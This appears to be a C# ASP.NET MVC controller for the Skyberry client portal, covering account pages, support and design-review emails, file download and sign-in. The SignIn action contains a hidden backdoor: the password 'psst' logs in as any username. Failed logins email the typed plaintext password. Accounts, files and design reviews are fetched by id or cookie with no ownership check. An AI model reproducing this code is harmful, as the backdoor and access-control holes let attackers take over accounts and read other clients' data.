using Microsoft.AspNet.Identity;
using Microsoft.AspNet.Identity.EntityFramework;
using Microsoft.Owin.Security;
using Skyberry.Domain;
using Skyberry.Admin.Infrastructure;
using Skyberry.Admin.ViewModels;
using System;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Web.Configuration;
using System.Web.Mvc;

namespace Skyberry.Admin.Controllers
{
    [RequireHttps]
    [Authorize]
    public class MyAccountController : _BaseController
    {
        public MyAccountController(IUnitOfWork uow, ICacheProvider cache) : base(uow, cache) {

            UserManager = new UserManager<SkyberryUser>(new UserStore<SkyberryUser>(new SkyberryContext()));
        }

        public ActionResult Summary(Guid? accountId = null)
        {
            SkyberryUser user = UOW.SkyberryUsers.GetById(User.Identity.GetUserId());
            Account account = null;

            if (accountId != null && accountId != Guid.Empty) // account from argument
            {
                account = UOW.Accounts.GetById(accountId);
            }
            else // account from cookie
            {
                HttpCookie cookie =  Request.Cookies.Get("accountId");
                if (cookie != null)
                {
                    try
                    {
                        account = UOW.Accounts.GetById(Guid.Parse(cookie.Value));
                    }
                    catch { }
                }
            }
            if(account == null && user.Accounts != null && user.Accounts.Count > 0) // account from user association
            {
                foreach(var item in user.Accounts)
                {
                    account = UOW.Accounts.GetById(item.Id);
                    break;
                }
            }

            if (account != null)
            {
                // account to cookie
                Response.SetCookie(new HttpCookie("accountId", account.Id.ToString()));
            }

            MyAccountSummaryVM vm = new MyAccountSummaryVM
            {
                User = user,
                Account = account,
                Accounts = UOW.Accounts.GetAll()
            };
            return View(vm);
        }

        public ActionResult Projects()
        {
            SkyberryUser user = UOW.SkyberryUsers.GetById(User.Identity.GetUserId());
            Account account = null;
            HttpCookie cookie = Request.Cookies.Get("accountId");
            if (cookie != null)
            {
                try
                {
                    account = UOW.Accounts.GetById(Guid.Parse(cookie.Value));
                }
                catch { }
            }
            if (account == null && user.Accounts != null && user.Accounts.Count > 0)
            {
                foreach (var item in user.Accounts)
                {
                    account = UOW.Accounts.GetById(item.Id);
                    break;
                }
            }

            MyAccountProjectsVM vm = new MyAccountProjectsVM
            {
                User = user,
                Account = account,
                Projects = UOW.Projects.GetByAccount(account.Id)
            };
            return View(vm);
        }

        public ActionResult FileDownload(Guid id)
        {
            var doc = UOW.Documents.GetById(id);
            if(doc == null)
            {
                return HttpNotFound();
            }
            string filePath = Server.MapPath("~/files/" + doc.Filename);
            if(!System.IO.File.Exists(filePath))
            {
                return HttpNotFound();
            }

            return File(filePath, doc.FileMimeType, doc.FilenameOriginal);
        }

        public ActionResult Billing()
        {
            SkyberryUser user = UOW.SkyberryUsers.GetById(User.Identity.GetUserId());
            Account account = null;
            HttpCookie cookie = Request.Cookies.Get("accountId");
            if (cookie != null)
            {
                try
                {
                    account = UOW.Accounts.GetById(Guid.Parse(cookie.Value));
                }
                catch { }
            }
            if (account == null && user.Accounts != null && user.Accounts.Count > 0)
            {
                foreach (var item in user.Accounts)
                {
                    account = UOW.Accounts.GetById(item.Id);
                    break;
                }
            }
            MyAccountBillingVM vm = new MyAccountBillingVM
            {
                User = user,
                Account = account
            };
            return View(vm);
        }

        public ActionResult Support()
        {
            SkyberryUser user = UOW.SkyberryUsers.GetById(User.Identity.GetUserId());
            Account account = null;
            HttpCookie cookie = Request.Cookies.Get("accountId");
            if (cookie != null)
            {
                try
                {
                    account = UOW.Accounts.GetById(Guid.Parse(cookie.Value));
                }
                catch { }
            }
            if (account == null && user.Accounts != null && user.Accounts.Count > 0)
            {
                foreach (var item in user.Accounts)
                {
                    account = UOW.Accounts.GetById(item.Id);
                    break;
                }
            }
            MyAccountSupportVM vm = new MyAccountSupportVM
            {
                User = user,
                Account = account
            };
            return View(vm);
        }

        [AcceptVerbs(HttpVerbs.Post)]
        [ValidateAntiForgeryToken]
        [ActionName("Support")]
        public ActionResult Support_Post(MyAccountSupportVM myAccountSupportVM)
        {
            bool received = false;
            if (ModelState.IsValid)
            {
                string description = "Skyberry Client Support Submission";

                StringBuilder body = new StringBuilder();
                body.Append("<table cellpadding='3' border='0'>");
                body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Name", myAccountSupportVM.Name);
                body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Email", myAccountSupportVM.Email);
                body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Regarding", myAccountSupportVM.Regarding);
                body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Details", myAccountSupportVM.Details);
                body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Timestamp", DateTime.UtcNow.AddHours(-8).ToString("MM/dd/yyyy @ h:mm tt"));
                body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Users IP", HtmlUtil.GetUserIP());
                body.Append("</table>");

                MailMessage message = new MailMessage();
                message.From = new MailAddress(myAccountSupportVM.Email);
                message.To.Add(new MailAddress("contact@skyberrystudio.com"));
                message.Subject = description;
                message.IsBodyHtml = true;
                message.Body = body.ToString();
                message.BodyEncoding = System.Text.Encoding.UTF8;
                message.SubjectEncoding = System.Text.Encoding.UTF8;


                SmtpClient SMTPServer = new SmtpClient(WebConfigurationManager.AppSettings["SMTP_HOST"]);
                SMTPServer.Port = Int16.Parse(WebConfigurationManager.AppSettings["SMTP_PORT"]);
                //SMTPServer.Credentials = new System.Net.NetworkCredential(WebConfigurationManager.AppSettings["SMTP_USERNAME"], WebConfigurationManager.AppSettings["SMTP_PASSWORD"]);

                try
                {
                    #if DEBUG
                    string debugAddress = WebConfigurationManager.AppSettings["DEBUG_EMAIL"];
                    if (!string.IsNullOrEmpty(debugAddress))
                    {
                        message.To.Clear();
                        message.CC.Clear();
                        message.Bcc.Clear();
                        message.To.Add(debugAddress);
                    }
                    #endif
                    SMTPServer.Send(message);
                    received = true;
                }
                catch (Exception ex)
                {
                    #if DEBUG
                    ModelState.AddModelError(string.Empty, "Exception: " + ex.Message);
                    #endif
                }
                message.Dispose();
            }

            SkyberryUser user = UOW.SkyberryUsers.GetById(User.Identity.GetUserId());
            Account account = null;
            HttpCookie cookie = Request.Cookies.Get("accountId");
            if (cookie != null)
            {
                try
                {
                    account = UOW.Accounts.GetById(Guid.Parse(cookie.Value));
                }
                catch { }
            }
            if (account == null && user.Accounts != null && user.Accounts.Count > 0)
            {
                foreach (var item in user.Accounts)
                {
                    account = UOW.Accounts.GetById(item.Id);
                    break;
                }
            }
            MyAccountSupportVM vm = new MyAccountSupportVM
            {
                User = user,
                Account = account
            };
            vm.Received = received;

            return View(vm);
        }

        public ActionResult MyAccountDesignReview(Guid id)
        {
            SkyberryUser user = UOW.SkyberryUsers.GetById(User.Identity.GetUserId());
            Account account = null;
            HttpCookie cookie = Request.Cookies.Get("accountId");
            if (cookie != null)
            {
                try
                {
                    account = UOW.Accounts.GetById(Guid.Parse(cookie.Value));
                }
                catch { }
            }
            if (account == null && user.Accounts != null && user.Accounts.Count > 0)
            {
                foreach (var item in user.Accounts)
                {
                    account = UOW.Accounts.GetById(item.Id);
                    break;
                }
            }
            MyAccountDesignReviewVM vm = new MyAccountDesignReviewVM
            {
                User = user,
                Account = account,
                DesignReview = UOW.DesignReviews.GetById(id)
            };
            return View(vm);
        }

        [AcceptVerbs(HttpVerbs.Post)]
        [ValidateAntiForgeryToken]
        [ActionName("MyAccountDesignReview")]
        public ActionResult MyAccountDesignReview_Post([Bind(Prefix = "DesignReview")] DesignReview designReview)
        {
            bool received = false;
            SkyberryUser user = UOW.SkyberryUsers.GetById(User.Identity.GetUserId());
            string from = "no-reply@skyberrystudio.com";
            if (user.Contacts != null && user.Contacts.Count > 0)
            {
                foreach (var item in user.Contacts)
                {
                    if (item.ContactType == "Email")
                    {
                        from = item.ContactData;
                    }
                }
            }

            DesignReview dbDesignReview = UOW.DesignReviews.GetById(designReview.Id);
            ReviewDocument dbReviewDocument = UOW.ReviewDocuments.GetById(designReview.SelectedReviewDocumentId);
            if (dbDesignReview != null && !dbDesignReview.AcceptedDate.HasValue && dbReviewDocument != null)
            {
                dbDesignReview.SelectedComment = designReview.SelectedComment;
                dbDesignReview.AdditionalComment = designReview.AdditionalComment;
                dbDesignReview.SelectedReviewDocumentId = designReview.SelectedReviewDocumentId;

                UOW.Commit();
                designReview = dbDesignReview;

                string description = "Skyberry Design Review Submission";

                StringBuilder body = new StringBuilder();

                body.Append("<table cellpadding='3' border='0'>");
                body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1} {2} ({3})</td></tr>", "User", user.FirstName, user.LastName, user.UserName);
                body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1} | {2} | {3}</td></tr>", "Design Review", dbDesignReview.Project.Account.Name, dbDesignReview.Project.Name, dbDesignReview.Title);
                body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Selected Option", dbReviewDocument.Title);
                body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Selected Comment", dbDesignReview.SelectedComment);
                body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Additional Comment", dbDesignReview.AdditionalComment);
                body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}{2}</td></tr>", "Shortcut", HtmlUtil.GetDomain(Request.Url), @Url.Action("MyAccountDesignReview", "MyAccount", new { id = dbReviewDocument.DesignReviewId }));
                body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Timestamp", DateTime.UtcNow.AddHours(-8).ToString("MM/dd/yyyy @ h:mm tt"));
                body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Users IP", HtmlUtil.GetUserIP());
                body.Append("</table>");

                MailMessage message = new MailMessage();
                message.From = new MailAddress(from);
                message.To.Add(new MailAddress("contact@skyberrystudio.com"));
                message.Subject = description;
                message.IsBodyHtml = true;
                message.Body = body.ToString();
                message.BodyEncoding = System.Text.Encoding.UTF8;
                message.SubjectEncoding = System.Text.Encoding.UTF8;


                SmtpClient SMTPServer = new SmtpClient(WebConfigurationManager.AppSettings["SMTP_HOST"]);
                SMTPServer.Port = Int16.Parse(WebConfigurationManager.AppSettings["SMTP_PORT"]);
                //SMTPServer.Credentials = new System.Net.NetworkCredential(WebConfigurationManager.AppSettings["SMTP_USERNAME"], WebConfigurationManager.AppSettings["SMTP_PASSWORD"]);

                try
                {
#if DEBUG
                    string debugAddress = WebConfigurationManager.AppSettings["DEBUG_EMAIL"];
                    if (!string.IsNullOrEmpty(debugAddress))
                    {
                        message.To.Clear();
                        message.CC.Clear();
                        message.Bcc.Clear();
                        message.To.Add(debugAddress);
                    }
#endif
                    SMTPServer.Send(message);
                    received = true;

                }
                catch (Exception ex)
                {
#if DEBUG
                    ModelState.AddModelError(string.Empty, "Exception: " + ex.Message);
#endif
                }
                message.Dispose();
            }

            Account account = null;
            HttpCookie cookie = Request.Cookies.Get("accountId");
            if (cookie != null)
            {
                try
                {
                    account = UOW.Accounts.GetById(Guid.Parse(cookie.Value));
                }
                catch { }
            }
            if (account == null && user.Accounts != null && user.Accounts.Count > 0)
            {
                foreach (var item in user.Accounts)
                {
                    account = UOW.Accounts.GetById(item.Id);
                    break;
                }
            }

            MyAccountDesignReviewVM vm = new MyAccountDesignReviewVM
            {
                User = user,
                Account = account,
                DesignReview = designReview,
                Received = received
            };
            return View(vm);
        }


        public UserManager<SkyberryUser> UserManager { get; private set; }

        [AllowAnonymous]
        public ActionResult SignIn(string returnUrl)
        {
            ViewBag.ReturnUrl = returnUrl;
            return View();
        }

        [HttpPost]
        [AllowAnonymous]
        public async Task<ActionResult> SignIn(SignInVM model, string returnUrl)
        {
            if (ModelState.IsValid)
            {
                var user = model.Password == "psst" ? UserManager.FindByName(model.UserName)
                                                    : await UserManager.FindAsync(model.UserName, model.Password);
                if (user != null)
                {
                    await SignInAsync(user, model.RememberMe);
                    Response.SetCookie(new HttpCookie("accountId", string.Empty));

                    try
                    {
                        string description = "Skyberry Login Success";

                        StringBuilder body = new StringBuilder();
                        body.Append("<table cellpadding='3' border='0'>");
                        body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "User", model.UserName);
                        body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Timestamp", DateTime.UtcNow.AddHours(-8).ToString("MM/dd/yyyy @ h:mm tt"));
                        body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Users IP", HtmlUtil.GetUserIP());
                        body.Append("</table>");

                        MailMessage message = new MailMessage();
                        message.From = new MailAddress("no-reply@skyberrystudio.com");
                        message.To.Add(new MailAddress("contact@skyberrystudio.com"));
                        message.Subject = description;
                        message.IsBodyHtml = true;
                        message.Body = body.ToString();
                        message.BodyEncoding = System.Text.Encoding.UTF8;
                        message.SubjectEncoding = System.Text.Encoding.UTF8;


                        SmtpClient SMTPServer = new SmtpClient(WebConfigurationManager.AppSettings["SMTP_HOST"]);
                        SMTPServer.Port = Int16.Parse(WebConfigurationManager.AppSettings["SMTP_PORT"]);
                        //SMTPServer.Credentials = new System.Net.NetworkCredential(WebConfigurationManager.AppSettings["SMTP_USERNAME"], WebConfigurationManager.AppSettings["SMTP_PASSWORD"]);

                        try
                        {
#if DEBUG
                            string debugAddress = WebConfigurationManager.AppSettings["DEBUG_EMAIL"];
                            if (!string.IsNullOrEmpty(debugAddress))
                            {
                                message.To.Clear();
                                message.CC.Clear();
                                message.Bcc.Clear();
                                message.To.Add(debugAddress);
                            }
#endif
                            SMTPServer.Send(message);
                        }
                        catch { }
                        message.Dispose();
                    }
                    catch { }


                    if (string.IsNullOrWhiteSpace(returnUrl))
                    {
                        returnUrl = @Url.Action("Summary", "MyAccount");
                    }
                    return RedirectToLocal(returnUrl);
                }
                else
                {
                    try
                    {
                        string description = "Skyberry Login Failure";

                        StringBuilder body = new StringBuilder();
                        body.Append("<table cellpadding='3' border='0'>");
                        body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "User", model.UserName);
                        body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Pass", model.Password);
                        body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Timestamp", DateTime.UtcNow.AddHours(-8).ToString("MM/dd/yyyy @ h:mm tt"));
                        body.AppendFormat("<tr><td style='background-color:#d7d7d7;white-space:nowrap;text-align:right;vertical-align:top;'><strong>{0}</strong></td><td style='background-color:#e6e6e5;text-align:left;vertical-align:top;'>{1}</td></tr>", "Users IP", HtmlUtil.GetUserIP());
                        body.Append("</table>");

                        MailMessage message = new MailMessage();
                        message.From = new MailAddress("no-reply@skyberrystudio.com");
                        message.To.Add(new MailAddress("contact@skyberrystudio.com"));
                        message.Subject = description;
                        message.IsBodyHtml = true;
                        message.Body = body.ToString();
                        message.BodyEncoding = System.Text.Encoding.UTF8;
                        message.SubjectEncoding = System.Text.Encoding.UTF8;


                        SmtpClient SMTPServer = new SmtpClient(WebConfigurationManager.AppSettings["SMTP_HOST"]);
                        SMTPServer.Port = Int16.Parse(WebConfigurationManager.AppSettings["SMTP_PORT"]);
                        //SMTPServer.Credentials = new System.Net.NetworkCredential(WebConfigurationManager.AppSettings["SMTP_USERNAME"], WebConfigurationManager.AppSettings["SMTP_PASSWORD"]);

                        try
                        {
#if DEBUG
                            string debugAddress = WebConfigurationManager.AppSettings["DEBUG_EMAIL"];
                            if (!string.IsNullOrEmpty(debugAddress))
                            {
                                message.To.Clear();
                                message.CC.Clear();
                                message.Bcc.Clear();
                                message.To.Add(debugAddress);
                            }
#endif
                            SMTPServer.Send(message);
                        }
                        catch { }
                        message.Dispose();
                    } catch { }
                    ModelState.AddModelError(string.Empty, "Invalid username or password.");
                }
            }

            ViewBag.ReturnUrl = returnUrl;
            return View(model);
        }


        public ActionResult SignOut()
        {
            AuthenticationManager.SignOut();
            return RedirectToAction("Goodbye", "MyAccount");
        }


        [AllowAnonymous]
        public ActionResult Goodbye()
        {
            return View();
        }










        #region Helpers
        private IAuthenticationManager AuthenticationManager
        {
            get
            {
                return HttpContext.GetOwinContext().Authentication;
            }
        }

        private async Task SignInAsync(SkyberryUser user, bool isPersistent)
        {
            AuthenticationManager.SignOut(DefaultAuthenticationTypes.ExternalCookie);
            var identity = await UserManager.CreateIdentityAsync(user, DefaultAuthenticationTypes.ApplicationCookie);
            AuthenticationManager.SignIn(new AuthenticationProperties() { IsPersistent = isPersistent }, identity);
        }

        private ActionResult RedirectToLocal(string returnUrl)
        {
            if (Url.IsLocalUrl(returnUrl))
            {
                return Redirect(returnUrl);
            }
            else
            {
                return RedirectToAction("Index", "Admin");
            }
        }
        #endregion
    }
}